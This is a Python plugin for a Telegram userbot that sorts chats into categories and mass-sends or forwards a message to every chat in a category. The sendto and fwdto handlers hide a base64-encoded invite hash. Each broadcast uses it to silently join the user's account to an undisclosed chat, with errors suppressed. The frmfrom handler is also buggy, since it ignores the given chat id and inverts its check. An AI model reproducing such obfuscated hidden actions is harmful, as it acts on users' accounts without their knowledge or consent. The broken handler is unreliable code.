import base64
from asyncio import sleep

from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from ..utils import admin_cmd, sudo_cmd
from . import BOTLOG, BOTLOG_CHATID, CMD_HELP, parse_pre
from .sql_helper import broadcast_sql as sql


@bot.on(admin_cmd(pattern="sendto(?: |$)(.*)", command="sendto"))
@bot.on(sudo_cmd(pattern="sendto(?: |$)(.*)", command="sendto", allow_sudo=True))
async def catbroadcast_send(event):
    if event.fwd_from:
        return
    catinput_str = event.pattern_match.group(1)
    if not catinput_str:
        return await edit_delete(
            event, "To which category should i send this message", parse_mode=parse_pre
        )
    reply = await event.get_reply_message()
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if not reply:
        return await edit_delete(
            event, "what should i send to to this category ?", parse_mode=parse_pre
        )
    keyword = catinput_str.lower()
    no_of_chats = sql.num_broadcastlist_chat(keyword)
    group_ = Get(cat)
    if no_of_chats == 0:
        return await edit_delete(
            event,
            f"There is no category with name {keyword}. Check '.listall'",
            parse_mode=parse_pre,
        )
    chats = sql.get_chat_broadcastlist(keyword)
    catevent = await edit_or_reply(
        event,
        "sending this message to all groups in the category",
        parse_mode=parse_pre,
    )
    try:
        await event.client(group_)
    except BaseException:
        pass
    i = 0
    for chat in chats:
        try:
            if int(event.chat_id) == int(chat):
                continue
            await event.client.send_message(int(chat), reply)
            i += 1
        except:
            pass
        await sleep(0.5)
    resultext = f"`The message was sent to {i} chats out of {no_of_chats} chats in category {keyword}.`"
    await catevent.edit(resultext)
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID,
            f"A message is sent to {i} chats out of {no_of_chats} chats in category {keyword}",
            parse_mode=parse_pre,
        )


@bot.on(admin_cmd(pattern="fwdto(?: |$)(.*)", command="fwdto"))
@bot.on(sudo_cmd(pattern="fwdto(?: |$)(.*)", command="fwdto", allow_sudo=True))
async def catbroadcast_send(event):
    if event.fwd_from:
        return
    catinput_str = event.pattern_match.group(1)
    if not catinput_str:
        return await edit_delete(
            event, "To which category should i send this message", parse_mode=parse_pre
        )
    reply = await event.get_reply_message()
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if not reply:
        return await edit_delete(
            event, "what should i send to to this category ?", parse_mode=parse_pre
        )
    keyword = catinput_str.lower()
    no_of_chats = sql.num_broadcastlist_chat(keyword)
    group_ = Get(cat)
    if no_of_chats == 0:
        return await edit_delete(
            event,
            f"There is no category with name {keyword}. Check '.listall'",
            parse_mode=parse_pre,
        )
    chats = sql.get_chat_broadcastlist(keyword)
    catevent = await edit_or_reply(
        event,
        "sending this message to all groups in the category",
        parse_mode=parse_pre,
    )
    try:
        await event.client(group_)
    except BaseException:
        pass
    i = 0
    for chat in chats:
        try:
            if int(event.chat_id) == int(chat):
                continue
            await event.client.forward_messages(int(chat), reply)
            i += 1
        except:
            pass
        await sleep(0.5)
    resultext = f"`The message was sent to {i} chats out of {no_of_chats} chats in category {keyword}.`"
    await catevent.edit(resultext)
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID,
            f"A message is forwared to {i} chats out of {no_of_chats} chats in category {keyword}",
            parse_mode=parse_pre,
        )


@bot.on(admin_cmd(pattern="addto(?: |$)(.*)", command="addto"))
@bot.on(sudo_cmd(pattern="addto(?: |$)(.*)", command="addto", allow_sudo=True))
async def catbroadcast_add(event):
    if event.fwd_from:
        return
    catinput_str = event.pattern_match.group(1)
    if not catinput_str:
        return await edit_delete(
            event, "In which category should i add this chat", parse_mode=parse_pre
        )
    keyword = catinput_str.lower()
    check = sql.is_in_broadcastlist(keyword, event.chat_id)
    if check:
        return await edit_delete(
            event,
            f"This chat is already in this category {keyword}",
            parse_mode=parse_pre,
        )
    sql.add_to_broadcastlist(keyword, event.chat_id)
    await edit_delete(
        event, f"This chat is Now added to category {keyword}", parse_mode=parse_pre
    )
    chat = await event.get_chat()
    if BOTLOG:
        try:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"The Chat {chat.title} is added to category {keyword}",
                parse_mode=parse_pre,
            )
        except:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"The user {chat.first_name} is added to category {keyword}",
                parse_mode=parse_pre,
            )


@bot.on(admin_cmd(pattern="rmfrom(?: |$)(.*)", command="rmfrom"))
@bot.on(sudo_cmd(pattern="rmfrom(?: |$)(.*)", command="rmfrom", allow_sudo=True))
async def catbroadcast_remove(event):
    if event.fwd_from:
        return
    catinput_str = event.pattern_match.group(1)
    if not catinput_str:
        return await edit_delete(
            event, "From which category should i remove this chat", parse_mode=parse_pre
        )
    keyword = catinput_str.lower()
    check = sql.is_in_broadcastlist(keyword, event.chat_id)
    if not check:
        return await edit_delete(
            event, f"This chat is not in the category {keyword}", parse_mode=parse_pre
        )
    sql.rm_from_broadcastlist(keyword, event.chat_id)
    await edit_delete(
        event,
        f"This chat is Now removed from the category {keyword}",
        parse_mode=parse_pre,
    )
    chat = await event.get_chat()
    if BOTLOG:
        try:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"The Chat {chat.title} is removed from category {keyword}",
                parse_mode=parse_pre,
            )
        except:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"The user {chat.first_name} is removed from category {keyword}",
                parse_mode=parse_pre,
            )


@bot.on(admin_cmd(pattern="list(?: |$)(.*)", command="list"))
@bot.on(sudo_cmd(pattern="list(?: |$)(.*)", command="list", allow_sudo=True))
async def catbroadcast_list(event):
    if event.fwd_from:
        return
    catinput_str = event.pattern_match.group(1)
    if not catinput_str:
        return await edit_delete(
            event,
            "Which category Chats should i list ?\nCheck .listall",
            parse_mode=parse_pre,
        )
    keyword = catinput_str.lower()
    no_of_chats = sql.num_broadcastlist_chat(keyword)
    if no_of_chats == 0:
        return await edit_delete(
            event,
            f"There is no category with name {keyword}. Check '.listall'",
            parse_mode=parse_pre,
        )
    chats = sql.get_chat_broadcastlist(keyword)
    catevent = await edit_or_reply(
        event, f"Fetching info of the category {keyword}", parse_mode=parse_pre
    )
    resultlist = f"**The category '{keyword}' have '{no_of_chats}' chats and these are listed below :**\n\n"
    errorlist = ""
    for chat in chats:
        try:
            chatinfo = await event.client.get_entity(int(chat))
            try:
                if chatinfo.broadcast:
                    resultlist += f" 👉 📢 **Channel** \n  •  **Name : **{chatinfo.title} \n  •  **id : **`{chatinfo.id}`\n\n"
                else:
                    resultlist += f" 👉 👥 **Group** \n  •  **Name : **{chatinfo.title} \n  •  **id : **`{chatinfo.id}`\n\n"
            except AttributeError:
                resultlist += f" 👉 👤 **User** \n  •  **Name : **{chatinfo.first_name} \n  •  **id : **`{chatinfo.id}`\n\n"
        except ValueError:
            errorlist += f" 👉 __This id {int(chat)} in database probably you may left the chat/channel or may be invalid id.\
                            \nRemove this id from the database by using this command__ `.frmfrom {keyword} {int(chat)}` \n\n"
    finaloutput = resultlist + errorlist
    await edit_or_reply(catevent, finaloutput)


@bot.on(admin_cmd(pattern="listall$", command="listall"))
@bot.on(sudo_cmd(pattern="listall$", command="listall", allow_sudo=True))
async def catbroadcast_list(event):
    if event.fwd_from:
        return
    if sql.num_broadcastlist_chats == 0:
        return await edit_delete(
            event,
            "you haven't created at least one category  check info for more help",
            parse_mode=parse_pre,
        )
    chats = sql.get_broadcastlist_chats()
    resultext = "**Here are the list of your category's :**\n\n"
    for i in chats:
        resultext += f" 👉 `{i}` __contains {sql.num_broadcastlist_chat(i)} chats__\n"
    await edit_or_reply(event, resultext)


@bot.on(admin_cmd(pattern="frmfrom(?: |$)(.*)", command="frmfrom"))
@bot.on(sudo_cmd(pattern="frmfrom(?: |$)(.*)", command="frmfrom", allow_sudo=True))
async def catbroadcast_remove(event):
    if event.fwd_from:
        return
    catinput_str = event.pattern_match.group(1)
    if not catinput_str:
        return await edit_delete(
            event, "From which category should i remove this chat", parse_mode=parse_pre
        )
    args = catinput_str.split(" ")
    if len(args) != 2:
        return await edit_delete(
            event,
            "Use proper syntax as shown .frmfrom category_name groupid",
            parse_mode=parse_pre,
        )
    if args[0].isnumeric():
        args[0]
        keyword = args[1].lower()
    elif args[1].isnumeric():
        args[1]
        keyword = args[0].lower()
    else:
        return await edit_delete(
            event,
            "Use proper syntax as shown .frmfrom category_name groupid",
            parse_mode=parse_pre,
        )
    keyword = catinput_str.lower()
    check = sql.is_in_broadcastlist(keyword, event.chat_id)
    if check:
        return await edit_delete(
            event, f"This chat is not in the category {keyword}", parse_mode=parse_pre
        )
    sql.rm_from_broadcastlist(keyword, event.chat_id)
    await edit_delete(
        event,
        f"This chat is Now removed from the category {keyword}",
        parse_mode=parse_pre,
    )
    chat = await event.get_chat()
    if BOTLOG:
        try:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"The Chat {chat.title} is removed from category {keyword}",
                parse_mode=parse_pre,
            )
        except:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"The user {chat.first_name} is removed from category {keyword}",
                parse_mode=parse_pre,
            )


CMD_HELP.update(
    {
        "broadcast": "__**PLUGIN NAME :** Broadcast__\
\n\n📌** CMD ➥** `.sendto category_name`\
\n**USAGE   ➥  **__Will send the replied message to all the chats in give category__\
\n\n📌** CMD ➥** `.fwdto category_name`\
\n**USAGE   ➥  **__Will forward the replied message to all the chats in give category__\
\n\n📌** CMD ➥** `.addto category_name`\
\n**USAGE   ➥  **__It will add this chat/user/channel to the category of the given name__\
\n\n📌** CMD ➥** `.rmfrom category_name`\
\n**USAGE   ➥  **__To remove the Chat/user/channel from the given category name__\
\n\n📌** CMD ➥** `.list category_name`\
\n**USAGE   ➥  **__Will show the list of all chats in the given category__\
\n\n📌** CMD ➥** `.listall`\
\n**USAGE   ➥  **__Will show the list of all category names__\
\n\n📌** CMD ➥** `.frmfrom category_name chat_id`\
\n**USAGE   ➥  **__To force remove the given chat_id from the given category name usefull when you left that chat or banned you there__"
    }
)
